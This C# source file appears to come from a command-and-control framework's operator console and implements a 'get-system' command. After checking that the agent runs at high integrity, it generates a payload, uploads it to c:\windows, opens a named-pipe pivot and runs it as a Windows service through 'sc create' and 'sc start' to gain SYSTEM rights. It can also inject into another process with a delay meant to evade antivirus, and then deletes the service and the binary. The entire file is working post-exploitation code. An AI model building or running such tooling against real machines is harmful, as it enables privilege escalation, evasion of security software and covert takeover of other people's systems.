using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent;
using Commander.Executor;
using Common;
using Common.Payload;
using Spectre.Console;

namespace Commander.Commands.Composite
{
    public class GetSystemCommandOptions
    {
        public bool verbose { get; set; }
        public string pipe { get; set; }
        public string file { get; set; }
        public string path { get; set; }
        public string service { get; set; }
        public bool inject { get; set; }

        public int? injectDelay { get; set; }

        public string injectProcess { get; set; }

        public bool x86 { get; set; }


    }
    public class GetSystemCommand : CompositeCommand<GetSystemCommandOptions>
    {
        public override string Description => "Obtain system agent using Services";
        public override string Name => "get-system";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
             new Option<string>(new[] { "--pipe", "-n" }, () => "local","Name of the pipe used to pivot."),
             new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
             new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
             new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int?>(new[] { "--injectDelay", "-id" },() => null, "Delay before injection (AV evasion)"),
             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
        };

        protected override async Task<bool> CreateComposition(CommandContext<GetSystemCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            if(agent.Metadata.Integrity != "High")
            {
                context.Terminal.WriteError($"[X] Agent should be in High integrity context!");
                return false;
            }

            //var endpoint = ConnexionUrl.FromString(agent.Metadata.EndPoint);
            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{context.Options.pipe}");

            var options = new PayloadGenerationOptions()
            {
                Architecture =  agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = context.Options.verbose,
                ServerKey = context.Config.ServerConfig.Key,
                Type = PayloadType.Service,
                IsInjected = context.Options.inject
            };
            if (context.Options.injectDelay.HasValue)
                options.InjectionDelay = context.Options.injectDelay.Value;
            if (!string.IsNullOrEmpty(context.Options.injectProcess))
                options.InjectionProcess = context.Options.injectProcess;

            context.Terminal.WriteInfo($"[>] Generating Payload!");
            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.Terminal.WriteSuccess($"[+] Generation succeed!");



            context.Terminal.WriteLine($"Preparing to upload the file...");

            var fileName = string.IsNullOrEmpty(context.Options.file) ? ShortGuid.NewGuid() + ".exe" : context.Options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
            await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);

            this.Echo($"[>] Downloading file {fileName} to {path}...");
            this.Dowload(fileName, fileId, path);
            this.Delay(1);
            this.Echo($"[>] Starting pivot {endpoint}...");
            this.StartPivot(endpoint);
            this.Delay(1);
            this.Echo($"[>] Creating service...");
            this.Shell($"sc create {context.Options.service} binPath= \"{path}\"");
            this.Echo($"[>] Starting service...");
            this.Shell($"sc start {context.Options.service}");
           
            if(context.Options.inject)
            {

            }
            if (!context.Options.inject)
            {
                this.Echo($"[!] Don't forget to remove service after use! : shell sc delete {context.Options.service}");
            }
            else
            {
                this.Echo($"[>] Waiting {options.InjectionDelay}s to evade antivirus...");
                this.Delay(options.InjectionDelay + 10);
                this.Shell($"sc delete {context.Options.service}");
                this.Echo($"[>] Removing injector {path}...");
                this.Shell($"del {path}");
            }
            

            this.Echo($"[*] Execution done!");
            this.Echo(Environment.NewLine);

            return true;
        }
    }
}
